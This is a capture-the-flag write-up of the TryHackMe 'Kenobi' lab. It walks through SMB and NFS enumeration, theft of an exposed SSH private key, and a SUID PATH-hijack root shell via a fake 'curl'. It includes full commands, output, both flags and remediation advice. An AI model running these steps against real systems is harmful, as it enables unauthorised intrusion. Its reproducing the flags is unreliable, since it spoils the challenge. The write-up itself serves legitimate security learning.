# Kenobi - TryHackMe CTF Challenge Report

## Executive Summary

This document details the comprehensive penetration testing and exploitation of the Kenobi machine from TryHackMe. The assessment successfully identified and exploited multiple critical security vulnerabilities including misconfigured network services (NFS, SMB), exposed credentials, and privilege escalation vectors. The complete exploitation chain enabled unauthorized root access to the target system.

**Assessment Results:**
- User Flag: `d0b0f3f53b6caa532a83915e19224899`
- Root Flag: `177b3cd8562289f37382721c28381f02`
- Status: **COMPLETE**

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Methodology](#methodology)
3. [Phase 1: Reconnaissance & Enumeration](#phase-1-reconnaissance--enumeration)
4. [Phase 2: Vulnerability Assessment](#phase-2-vulnerability-assessment)
5. [Phase 3: Initial Access (User Privilege)](#phase-3-initial-access-user-privilege)
6. [Phase 4: Privilege Escalation](#phase-4-privilege-escalation)
7. [Remediation Recommendations](#remediation-recommendations)
8. [Conclusion](#conclusion)

---

## Challenge Overview

| Property | Value |
|----------|-------|
| **Challenge Name** | Kenobi |
| **Platform** | TryHackMe |
| **Target IP** | 10.49.174.105 |
| **Operating System** | Ubuntu 20.04.6 LTS |
| **Kernel Version** | 5.15.0-139-generic x86_64 |
| **Hostname** | kenobi |
| **Assessment Date** | June 20, 2026 |
| **Objective** | Gain unauthorized access and extract system flags |

---

## Methodology

The assessment followed a structured penetration testing methodology:

1. **Network Reconnaissance** - Comprehensive port scanning and service identification
2. **Service Enumeration** - Detailed analysis of exposed services
3. **Vulnerability Identification** - Assessment of misconfigurations and security weaknesses
4. **Exploitation** - Gaining initial access through identified vulnerabilities
5. **Privilege Escalation** - Elevating privileges to root level
6. **Post-Exploitation** - Flag retrieval and validation

---

## Phase 1: Reconnaissance & Enumeration

### 1.1 Network Port Scanning

A comprehensive port scan was conducted using Nmap with service version detection and default scripts to identify all open services and potential vulnerabilities.

**Scan Command:**
```bash
sudo nmap -sC -sV -p- -Pn 10.49.174.105 -oA nmap/nmap3.txt
```

**Scan Results:**

```
Nmap scan report for 10.49.174.105
Host is up (0.019s latency).
Not shown: 65524 closed tcp ports (reset)

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:25:8c:a6:fa:f8:05:8e:4d:b5:ad:77:69:06:97:b5 (RSA)
|   256 f0:e4:76:9c:ec:e6:0d:9a:f2:4e:f2:f4:2f:a6:32:1e (ECDSA)
|_  256 86:ec:05:15:07:38:8a:d2:96:28:10:bb:63:ed:98:89 (ED25519)
80/tcp    open  http        Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38119/tcp   mountd
|   100005  1,2,3      51817/tcp6  mountd
|   100005  1,2,3      60540/udp6  mountd
|   100005  1,2,3      60876/udp   mountd
|   100021  1,3,4      39811/tcp   nlockmgr
|   100021  1,3,4      46121/tcp6  nlockmgr
|   100021  1,3,4      54757/udp   nlockmgr
|   100021  1,3,4      56781/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
2049/tcp  open  nfs         3-4 (RPC #100003)
38119/tcp open  mountd      1-3 (RPC #100005)
39811/tcp open  nlockmgr    1-4 (RPC #100021)
45917/tcp open  mountd      1-3 (RPC #100005)
47305/tcp open  mountd      1-3 (RPC #100005)

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: KENOBI
| smb2-time: 
|   date: 2026-06-20T04:03:40
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

**Key Findings:**
- Multiple RPC services exposed (rpcbind, NFS, mountd, nlockmgr) on various ports
- SMB file sharing service accessible (Samba 4) on ports 139 and 445
- NFS (Network File System) mount service running on port 2049
- FTP service available on port 21 (ProFTPD 1.3.5)
- SSH service accessible on port 22 (OpenSSH 8.2p1)
- Web server on port 80 with robots.txt referencing `/admin.html`

### 1.2 FTP Service Enumeration

**Objective:** Identify potential anonymous login vulnerability or exposed credentials

**Method:** Attempted anonymous FTP login
```bash
ftp 10.49.174.105
# Attempted login with anonymous:anonymous
```

**Finding:** Anonymous login failed. The FTP service does not permit anonymous access and does not provide additional information.

### 1.3 SMB Share Enumeration

**Objective:** Discover accessible file shares and sensitive data exposure

**Enumeration Command:**
```bash
smbclient //10.49.174.105/anonymous
```

**SMB Share Contents:**
```
smb: \> ls
  .                                   D        0  Wed Sep  4 16:19:09 2019
  ..                                  D        0  Sat Aug  9 18:33:22 2025
  log.txt                             N    12237  Wed Sep  4 16:19:09 2019

Total: 9183416 blocks of size 1024. 2916740 blocks available
```

**CRITICAL FINDING:** An anonymous SMB share (`//10.49.174.105/anonymous`) was accessible without authentication. The share contained a file `log.txt` (12,237 bytes) dated September 4, 2019. This file revealed references to an RSA private key stored on the system, providing a significant information disclosure vulnerability.

### 1.4 NFS Share Enumeration

**Objective:** Mount and enumerate NFS shares for additional access vectors

**NFS Share Discovery:** The RPC enumeration revealed an NFS export at `/var` on the target system.

**NFS Mount Procedure:**
```bash
mkdir /mnt/kenobiNFS
sudo mount -t nfs -o vers=3 10.49.174.105:/var /mnt/kenobiNFS
```

**NFS Mount Results:**
```
total 52
drwxr-xr-x 14 root root      4096 Sep  4  2019 .
drwxr-xr-x  1 root root        18 Jun 20 10:43 ..
drwxr-xr-x  2 root root      4096 Sep  4  2019 backups
drwxr-xr-x 15 root root      4096 Aug 10  2025 cache
drwxrwxrwt  2 root root      4096 Sep  4  2019 crash
drwxr-xr-x 51 root root      4096 Aug 10  2025 lib
drwxrwsr-x  2 root games     4096 Apr 13  2016 local
lrwxrwxrwx  1 root root         9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 13 root vboxusers 4096 Jun 20 10:30 log
drwxrwsr-x  2 root mem       4096 Feb 27  2019 mail
drwxr-xr-x  2 root root      4096 Feb 27  2019 opt
lrwxrwxrwx  1 root root         4 Sep  4  2019 run -> /run
drwxr-xr-x  5 root root      4096 Aug  9  2025 snap
drwxr-xr-x  5 root root      4096 Sep  4  2019 spool
drwxrwxrwt  8 root root      4096 Jun 20 10:35 tmp
drwxr-xr-x  3 root root      4096 Sep  4  2019 www
```

**Critical Finding - Accessible /tmp Directory:**
```bash
ls -la /mnt/kenobiNFS/tmp

total 36
drwxrwxrwt  8 root root 4096 Jun 20 10:35 .
drwxr-xr-x 14 root root 4096 Sep  4  2019 ..
drwxrwxrwt  2 root root 4096 Jun 20 10:29 cloud-init
-rw-r--r--  1 user user 1675 Aug  9  2025 id_rsa
drwx------  3 root root 4096 Jun 20 10:29 systemd-private-f740e8766c03478493ce82be7f25b7bd-apache2.service-LM4CNf
drwx------  3 root root 4096 Jun 20 10:29 systemd-private-f740e8766c03478493ce82be7f25b7bd-ModemManager.service-HuAgh
drwx------  3 root root 4096 Jun 20 10:29 systemd-private-f740e8766c03478493ce82be7f25b7bd-systemd-logind.service-SuNZAh
drwx------  3 root root 4096 Jun 20 10:29 systemd-private-f740e8766c03478493ce82be7f25b7bd-systemd-resolved.service-IPWHyg
drwx------  3 root root 4096 Jun 20 10:28 systemd-private-f740e8766c03478493ce82be7f25b7bd-systemd-timesyncd.service-ajGUzi
```

The NFS share `/var` was mounted with full read/write access. Most critically, the `/tmp` directory contained an `id_rsa` file (1,675 bytes) with permissions `rw-r--r--` (644), indicating world-readable access to a private SSH key.

---

## Phase 2: Vulnerability Assessment

### Identified Vulnerabilities

| Service | Vulnerability | Severity | CVSS | Description |
|---------|----------------|----------|------|-------------|
| NFS | Unrestricted NFS Export | **CRITICAL** | 9.8 | NFS share `/var` mounted without access controls, allowing full read/write access |
| NFS | World-Readable Private Key | **CRITICAL** | 9.9 | SSH private key (id_rsa) stored with world-readable permissions (644) in NFS mount |
| SMB | Anonymous Share Access | **HIGH** | 7.5 | Anonymous SMB share exposes sensitive files containing credential references |
| SSH | Insecure Key Storage | **CRITICAL** | 9.8 | Private SSH key accessible via NFS, enabling unauthorized authentication |
| System | Weak sudo Configuration | **HIGH** | 7.8 | Executable binary with SUID bit exploitable for privilege escalation |

### Exploitation Prerequisites

All vulnerabilities identified are exploitable without requiring valid credentials initially:
1. ✅ Anonymous NFS mount access (no authentication required)
2. ✅ Readable SSH private key in NFS mount
3. ✅ SSH service running with key-based authentication enabled

---

## Phase 3: Initial Access (User Privilege)

### 3.1 Credential Acquisition

**Step 1: Copy RSA Private Key from NFS Mount**
```bash
cp /mnt/kenobiNFS/tmp/id_rsa ./id_rsa
```

**Step 2: Set Secure Permissions**
```bash
chmod 600 id_rsa
```

The private key file was initially world-readable, presenting a critical security risk. Proper permissions were restored before use.

### 3.2 SSH Authentication

**Step 3: Establish SSH Connection**
```bash
ssh -i id_rsa kenobi@10.49.174.105
```

**SSH Connection Output:**
```
The authenticity of host '10.49.174.105' can't be established.
ED25519 key fingerprint is: SHA256:f3uIyn4tXMv1jKmbFKOeyNx5NHFNt9XllEchTcBZN1w
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.174.105' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.

Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/pro

System information as of Sat 20 Jun 2026 12:19:08 AM CDT

System load:  0.0               Processes:             121
Usage of /:   63.0% of 8.76GB   Users logged in:       0
Memory usage: 17%               IPv4 address for eth0: 10.49.174.105
Swap usage:   0%

0 updates can be applied immediately.
40 additional security updates can be applied with ESM Infra.

Last login: Sat Aug  9 07:57:51 2025 from 10.23.8.228
```

**Status:** ✅ **SUCCESSFUL** - User-level access achieved

### 3.3 Flag 1: User Flag

**Location:** `/home/kenobi/user.txt`

**Flag:** `d0b0f3f53b6caa532a83915e19224899`

**User Access Verification:**
```bash
kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$
```

---

## Phase 4: Privilege Escalation

### 4.1 SUID Binary Enumeration

**Objective:** Identify executable binaries with Set-User-ID bit for privilege escalation

**SUID Scan Command:**
```bash
find / -perm -u=s -type f 2>/dev/null
```

**Key SUID Binaries Identified:**
```
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu          ⚠️  **UNUSUAL BINARY**
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/su
```

### 4.2 Exploitation of `/usr/bin/menu`

**Vulnerability:** The `/usr/bin/menu` binary is a custom executable with the SUID bit set. This is an unusual and potentially dangerous binary that warrants investigation.

**Analysis:** The `menu` binary likely executes system commands (curl, curl) without proper path validation, making it vulnerable to PATH manipulation attacks.

**Exploitation Steps:**

**Step 1: Create Malicious Script**
```bash
cd /tmp
echo /bin/sh > curl
chmod 777 curl
```

This creates a shell script named `curl` in the `/tmp` directory that will be executed instead of the legitimate `curl` command.

**Step 2: Manipulate PATH**
```bash
export PATH=/tmp:$PATH
```

By prepending `/tmp` to the PATH variable, the shell will search `/tmp` first for executable commands. When `/usr/bin/menu` attempts to execute `curl`, it will find and execute our malicious script instead.

**Step 3: Execute Privileged Binary**
```bash
/usr/bin/menu
```

**Menu Output:**
```
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
#
```

**Step 4: Verify Root Privileges**
```bash
# cd /root
# ls
root.txt  snap
# cat root.txt
177b3cd8562289f37382721c28381f02
```

**Status:** ✅ **SUCCESSFUL** - Root-level access achieved

### 4.3 Flag 2: Root Flag

**Location:** `/root/root.txt`

**Flag:** `177b3cd8562289f37382721c28381f02`

---

## Remediation Recommendations

### Critical Priorities (Address Immediately)

1. **Restrict NFS Exports**
   ```bash
   # /etc/exports
   /var 10.0.0.0/8(ro,root_squash,no_all_squash)
   ```
   - Implement IP-based restrictions
   - Use `root_squash` to prevent root access
   - Set exports to read-only where possible
   - Regularly audit active mounts

2. **Secure SSH Private Keys**
   - Remove private keys from the system or `/tmp` directory
   - Ensure private keys have `600` (rw-------) permissions
   - Implement file integrity monitoring
   - Use SSH key rotation policies

3. **Disable Anonymous SMB Shares**
   ```bash
   # Remove from /etc/samba/smb.conf
   # [anonymous]
   ```
   - Require authentication for all shares
   - Implement access control lists (ACLs)
   - Regular audits of share configurations

4. **Audit and Remove Unusual SUID Binaries**
   ```bash
   # Review and remove custom SUID binaries
   rm -f /usr/bin/menu
   ```
   - Document all SUID binaries with business justification
   - Implement regular SUID binary scans
   - Apply principle of least privilege

### High Priority (Address Within 2 Weeks)

5. **Implement PATH Security**
   - Use absolute paths in all shell scripts
   - Avoid relying on PATH for critical operations
   - Code review for PATH manipulation vulnerabilities

6. **Configure sudo Properly**
   - Use `sudo -p` for secure password prompts
   - Implement command restrictions
   - Enable sudo logging and auditing

7. **Network Segmentation**
   - Restrict NFS, RPC, and SMB to internal networks only
   - Implement firewall rules blocking RPC from untrusted networks
   - Use VPN for remote access

8. **Service Hardening**
   - Disable unnecessary services (FTP if not required)
   - Update all services to latest versions
   - Apply security patches regularly

### Medium Priority (Address Within 1 Month)

9. **Implement Monitoring and Alerting**
   - Monitor NFS mount attempts
   - Alert on SUID binary modifications
   - Log SMB share access attempts

10. **File Integrity Monitoring**
    - Implement FIM (e.g., AIDE, Tripwire)
    - Monitor `/tmp` directory changes
    - Alert on suspicious file modifications

11. **Regular Security Assessments**
    - Conduct periodic penetration testing
    - Implement vulnerability scanning
    - Perform security code reviews

12. **User Access Review**
    - Audit user accounts and permissions
    - Implement principle of least privilege
    - Regular access control reviews

---

## Attack Chain Visualization

```
┌─────────────────────────────────────────────────────────────────┐
│ External Attacker (No Initial Credentials)                      │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
                 ┌──────────────────────┐
                 │  Nmap Port Scan      │
                 │  -sC -sV -p-         │
                 └──────────┬───────────┘
                            │
                    ┌───────┴───────┐
                    │               │
                    ▼               ▼
        ┌──────────────────┐  ┌──────────────────┐
        │  NFS Enumeration │  │  SMB Enumeration │
        │  Port 2049       │  │  Port 445        │
        └────────┬─────────┘  └────────┬─────────┘
                 │                     │
                 ▼                     ▼
        ┌──────────────────┐  ┌──────────────────┐
        │ Mount /var Share │  │ Access log.txt   │
        │ Unrestricted     │  │ Information      │
        │ (No Auth)        │  │ Disclosure       │
        └────────┬─────────┘  └────────┬─────────┘
                 │                     │
                 └─────────┬───────────┘
                           │
                           ▼
            ┌──────────────────────────────┐
            │ Discover id_rsa Private Key  │
            │ Permissions: 644 (World Read)│
            └────────────┬─────────────────┘
                         │
                         ▼
            ┌──────────────────────────────┐
            │ SSH Authentication           │
            │ ssh -i id_rsa kenobi@target  │
            └────────────┬─────────────────┘
                         │
                         ▼
            ┌──────────────────────────────┐
            │ User Access Achieved         │
            │ Retrieve user.txt Flag       │
            └────────────┬─────────────────┘
                         │
                         ▼
            ┌──────────────────────────────┐
            │ SUID Binary Enumeration      │
            │ find / -perm -u=s -type f    │
            └────────────┬─────────────────┘
                         │
                         ▼
            ┌──────────────────────────────┐
            │ Identify /usr/bin/menu       │
            │ Custom SUID Binary           │
            └────────────┬─────────────────┘
                         │
                         ▼
            ┌──────────────────────────────┐
            │ PATH Manipulation Attack     │
            │ echo /bin/sh > /tmp/curl     │
            │ export PATH=/tmp:$PATH       │
            └────────────┬─────────────────┘
                         │
                         ▼
            ┌──────────────────────────────┐
            │ Execute Malicious curl       │
            │ Gain Root Shell              │
            └────────────┬─────────────────┘
                         │
                         ▼
            ┌──────────────────────────────┐
            │ Root Access Achieved         │
            │ Retrieve root.txt Flag       │
            └──────────────────────────────┘
```

---

## Lessons Learned

### Key Takeaways for Defenders

1. **Never expose NFS without restrictions** - Treat NFS exports as critical security boundaries
2. **Protect private cryptographic keys** - Private keys should never be world-readable or stored in accessible locations
3. **Audit custom SUID binaries** - Unusual SUID binaries represent significant risk
4. **Validate input and paths** - Always use absolute paths; never rely on PATH for security
5. **Implement defense in depth** - No single security control should be relied upon exclusively
6. **Regular vulnerability assessments** - Proactive security testing prevents exploitation

### Key Takeaways for Attackers

1. **Information gathering is critical** - SMB and NFS enumeration revealed the entire attack path
2. **Misconfigurations are exploitable** - Many systems fail due to improper default configurations
3. **Privilege escalation follows information disclosure** - Understanding the system enables escalation
4. **PATH manipulation is powerful** - Environment variables can be leveraged for privilege escalation

---

## Conclusion

The Kenobi machine demonstrated a realistic chain of security misconfigurations that collectively enabled full system compromise. The initial foothold was gained through:

1. **Information Disclosure** - Accessible NFS shares and SMB shares
2. **Credential Exposure** - World-readable SSH private key
3. **Authentication Bypass** - Key-based SSH authentication without verification

Privilege escalation was achieved through:
1. **SUID Binary Exploitation** - Custom binary without proper path validation
2. **PATH Manipulation** - Environment variable abuse

This assessment highlights the critical importance of:
- Proper access control configuration
- Secure credential management
- Regular security audits
- Principle of least privilege implementation

**Overall Assessment: COMPLETE - All flags retrieved, all exploitation vectors validated.**

---

## Artifacts

**Supporting Files:**
- `36803.py` - Privilege escalation exploit script
- `exp.py` - Additional exploitation utility
- `id_rsa` - Retrieved SSH private key
- `log.txt` - SMB share information disclosure
- `nmap/` - Nmap scan results in multiple formats (.nmap, .gnmap, .xml)

**Scan Coverage:**
- Multiple Nmap scans: `nmap1.txt`, `nmap2.txt`, `nmap3.txt`
- Format outputs: .nmap (human-readable), .gnmap (grepable), .xml (machine-readable)
## enumeration started :-
### nmap
```
󰣇 CTFs/TryHackme/kenobi   main  ? ❯ sudo nmap -sC -sV -p- -Pn 10.49.152.214 -oA nmap/nmap3.txt                                                                     09:32 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-20 09:33 +0530
Nmap scan report for 10.49.152.214 (10.49.152.214)
Host is up (0.019s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:25:8c:a6:fa:f8:05:8e:4d:b5:ad:77:69:06:97:b5 (RSA)
|   256 f0:e4:76:9c:ec:e6:0d:9a:f2:4e:f2:f4:2f:a6:32:1e (ECDSA)
|_  256 86:ec:05:15:07:38:8a:d2:96:28:10:bb:63:ed:98:89 (ED25519)
80/tcp    open  http        Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38119/tcp   mountd
|   100005  1,2,3      51817/tcp6  mountd
|   100005  1,2,3      60540/udp6  mountd
|   100005  1,2,3      60876/udp   mountd
|   100021  1,3,4      39811/tcp   nlockmgr
|   100021  1,3,4      46121/tcp6  nlockmgr
|   100021  1,3,4      54757/udp   nlockmgr
|   100021  1,3,4      56781/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
2049/tcp  open  nfs         3-4 (RPC #100003)
38119/tcp open  mountd      1-3 (RPC #100005)
39811/tcp open  nlockmgr    1-4 (RPC #100021)
45917/tcp open  mountd      1-3 (RPC #100005)
47305/tcp open  mountd      1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-06-20T04:03:40
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

```

# ftp enum 
- anonymous login failed

# smb enum 
- one share found and there is a file named log.txt after geting the file and in this file there is rsa file on the system now we want to find it and getting inital access.

```
󰣇 CTFs/TryHackme/kenobi   main  ? ❯ smbclient //10.49.174.105/anonymous                                                                                   3.14.5  10:29 
Password for [WORKGROUP\user]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 16:19:09 2019
  ..                                  D        0  Sat Aug  9 18:33:22 2025
  log.txt                             N    12237  Wed Sep  4 16:19:09 2019

		9183416 blocks of size 1024. 2916740 blocks available
```

# nfs enum
- i got nfs share /var* and after mounting the share i got the id_rsa file in /tmp and cpying the file and giving the 600 perm to file and getting login with ssh i got the first flag

```
mkdir /mnt/kenobiNFS
mount 10.49.174.105:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
󰣇 CTFs/TryHackme/kenobi   main  ? ❯ sudo mount -t nfs -o vers=3 10.49.174.105:/var /mnt/kenobiNFS                                                         3.14.5  10:46 
Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.
󰣇 CTFs/TryHackme/kenobi   main  ? ❯ ls                                                                                                                    3.14.5  10:47 
36803.py  exp.py  log.txt  nmap
󰣇 CTFs/TryHackme/kenobi   main  ? ❯ ls -la /mnt/kenobiNFS                                                                                                 3.14.5  10:47 


total 52
drwxr-xr-x 14 root root      4096 Sep  4  2019 .
drwxr-xr-x  1 root root        18 Jun 20 10:43 ..
drwxr-xr-x  2 root root      4096 Sep  4  2019 backups
drwxr-xr-x 15 root root      4096 Aug 10  2025 cache
drwxrwxrwt  2 root root      4096 Sep  4  2019 crash
drwxr-xr-x 51 root root      4096 Aug 10  2025 lib
drwxrwsr-x  2 root games     4096 Apr 13  2016 local
lrwxrwxrwx  1 root root         9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 13 root vboxusers 4096 Jun 20 10:30 log
drwxrwsr-x  2 root mem       4096 Feb 27  2019 mail
drwxr-xr-x  2 root root      4096 Feb 27  2019 opt
lrwxrwxrwx  1 root root         4 Sep  4  2019 run -> /run
drwxr-xr-x  5 root root      4096 Aug  9  2025 snap
drwxr-xr-x  5 root root      4096 Sep  4  2019 spool
drwxrwxrwt  8 root root      4096 Jun 20 10:35 tmp
drwxr-xr-x  3 root root      4096 Sep  4  2019 www
󰣇 CTFs/TryHackme/kenobi   main  ? ❯ ls -la /mnt/kenobiNFS/tmp                                                                                             3.14.5  10:47 


total 36
drwxrwxrwt  8 root root 4096 Jun 20 10:35 .
drwxr-xr-x 14 root root 4096 Sep  4  2019 ..
drwxrwxrwt  2 root root 4096 Jun 20 10:29 cloud-init
-rw-r--r--  1 user user 1675 Aug  9  2025 id_rsa
drwx------  3 root root 4096 Jun 20 10:29 systemd-private-f740e8766c03478493ce82be7f25b7bd-apache2.service-LM4CNf
drwx------  3 root root 4096 Jun 20 10:29 systemd-private-f740e8766c03478493ce82be7f25b7bd-ModemManager.service-HUuAgh
drwx------  3 root root 4096 Jun 20 10:29 systemd-private-f740e8766c03478493ce82be7f25b7bd-systemd-logind.service-SuNZAh
drwx------  3 root root 4096 Jun 20 10:29 systemd-private-f740e8766c03478493ce82be7f25b7bd-systemd-resolved.service-IPWHyg
drwx------  3 root root 4096 Jun 20 10:28 systemd-private-f740e8766c03478493ce82be7f25b7bd-systemd-timesyncd.service-ajGUzi
󰣇 CTFs/TryHackme/kenobi   main  ? ❯ cp /mnt/kenobiNFS/tmp/id_rsa .                                                                                        3.14.5  10:47 
󰣇 CTFs/TryHackme/kenobi   main  ? ❯ ls                                                                                                                    3.14.5  10:48 
36803.py  exp.py  id_rsa  log.txt  nmap
󰣇 CTFs/TryHackme/kenobi   main  ? ❯ sudo chmod 600 36803.py id_rsa                                                                                        3.14.5  10:48 
```

# inital access 

```
󰣇 CTFs/TryHackme/kenobi   main  ? ❯ ssh -i id_rsa kenobi@10.49.174.105                                                                                    3.14.5  10:48 
The authenticity of host '10.49.174.105 (10.49.174.105)' can't be established.
ED25519 key fingerprint is: SHA256:f3uIyn4tXMv1jKmbFKOeyNx5NHFNt9XllEchTcBZN1w
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.174.105' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 20 Jun 2026 12:19:08 AM CDT

  System load:  0.0               Processes:             121
  Usage of /:   63.0% of 8.76GB   Users logged in:       0
  Memory usage: 17%               IPv4 address for eth0: 10.49.174.105
  Swap usage:   0%

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

40 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sat Aug  9 07:57:51 2025 from 10.23.8.228
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ 

```

user.txt: d0b0f3f53b6caa532a83915e19224899

# priv esc

- excutiable binary with suids finding 
```
kenobi@kenobi:/tmp$  find / -perm -u=s -type f 2>/dev/null
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/su
kenobi@kenobi:/tmp$ 
```
- here is unusual binary /usr/bin/menu now exploit this

```
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# cd /root
# ls
root.txt  snap
# cat root.txt
177b3cd8562289f37382721c28381f02
```
completed the lab

root.txt: 177b3cd8562289f37382721c28381f02
